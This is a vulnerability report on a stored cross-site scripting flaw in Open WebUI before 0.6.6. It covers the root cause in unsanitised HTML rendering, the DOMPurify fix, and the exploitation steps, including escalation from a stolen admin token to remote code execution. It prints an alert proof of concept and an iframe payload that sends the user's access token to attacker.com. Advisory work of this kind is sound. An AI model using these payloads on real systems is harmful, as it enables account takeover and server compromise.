"# CVE Report: CVE-2025-46719\n\n## Summary\nCVE-2025-46719 is a high-severity vulnerability affecting the Open WebUI platform prior to version 0.6.6. The vulnerability is classified as CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'). It allows attackers to inject JavaScript code into chat transcripts, which is executed in the user's browser whenever the transcript is opened. This can lead to the theft of user access tokens, enabling attackers to gain full control over user accounts. Furthermore, if the attack is directed at an admin user, it can lead to Remote Code Execution (RCE) on the server hosting the Open WebUI backend.\n\n## Root Cause\nThe root cause of the vulnerability lies in the improper handling of HTML content in chat messages. Specifically, the code in `MarkdownTokens.svelte` uses the Svelte functionality `{@html}` to render HTML content without adequate sanitization. The relevant code snippet checks for specific HTML tags and directly renders them:\n\n```svelte\n{:else if token.text.includes(`<iframe src=\"${WEBUI_BASE_URL}/api/v1/files/`)}\n   {@html `${token.text}`}\n```\n\nThis allows an attacker to send a chat message containing a malicious payload, such as:\n\n```html\n<iframe src=\"http://localhost:8080/api/v1/files/\" onload=\"alert(1)\"></iframe>\n```\n\nWhen this message is opened, the JavaScript code in the `onload` attribute executes, demonstrating the vulnerability. The patch introduced in version 0.6.6 addresses this issue by sanitizing the HTML content using the `DOMPurify` library, which effectively neutralizes the potential for XSS attacks.\n\n## Exploitation Details\nTo exploit this vulnerability, an attacker would need to:\n1. Send a chat message containing a malicious payload that includes JavaScript code.\n2. The payload can be crafted to steal the user's access token by using a `fetch` request to send the token to a server controlled by the attacker.\n3. If the attacker targets an admin user, they can leverage the stolen token to create a new function on the backend server that executes arbitrary Python code, leading to RCE.\n\n### Example Exploit Payload\nAn example payload that could be used in a chat message is:\n\n```html\n<iframe src=\"http://localhost:8080/api/v1/files/\" onload=\"fetch('https://attacker.com/?token=' + localStorage.getItem('token'))\"></iframe>\n```\n\n## Environment Setup Requirements\n- **Port**: 8080\n- **Target Endpoint**: `/api/v1/files/`\n- **Explicit Configuration**: None explicitly mentioned in the advisory.\n\n## Complete PoC Code\nThe proof-of-concept code provided in the advisory for exploiting the vulnerability is as follows:\n\n```html\n<iframe src=\"http://localhost:8080/api/v1/files/\" onload=\"alert(1)\"></iframe>\n```\n\nThis payload can be sent as a chat message to demonstrate the XSS vulnerability."